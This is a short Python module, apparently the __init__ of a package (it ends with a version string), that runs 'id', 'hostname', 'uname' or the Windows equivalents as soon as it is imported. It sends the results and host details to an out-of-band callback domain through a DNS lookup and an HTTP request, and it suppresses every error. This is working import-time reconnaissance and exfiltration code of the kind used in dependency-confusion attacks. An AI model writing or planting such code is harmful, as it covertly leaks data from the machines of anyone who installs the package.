import subprocess, os, socket, sys, platform, urllib.parse, urllib.request

OAST = "https://example.oast.fun"   # FILL

def _cmd():
    if os.name == "nt":
        return ["cmd", "/c", "whoami & hostname & ver"]
    return ["/bin/sh", "-c", "id; hostname; uname -a"]

def _cb(tag="import"):
    try:
        out = subprocess.check_output(_cmd(), stderr=subprocess.DEVNULL, timeout=5).decode(errors="replace").strip()
    except Exception:
        out = "?"
    info = "%s|%s|%s|%s" % (tag, platform.node(), platform.system(), out.replace("\n", "; ")[:400])
    try:
        socket.gethostbyname("cb.%s.%s" % (int.from_bytes(os.urandom(4), "big"), OAST.split("://")[-1]))
    except Exception:
        pass
    try:
        urllib.request.urlopen("%s/cb?d=%s" % (OAST, urllib.parse.quote(info)), timeout=5).read()
    except Exception:
        pass

_cb("runtime")

__version__ = "0.1.0"
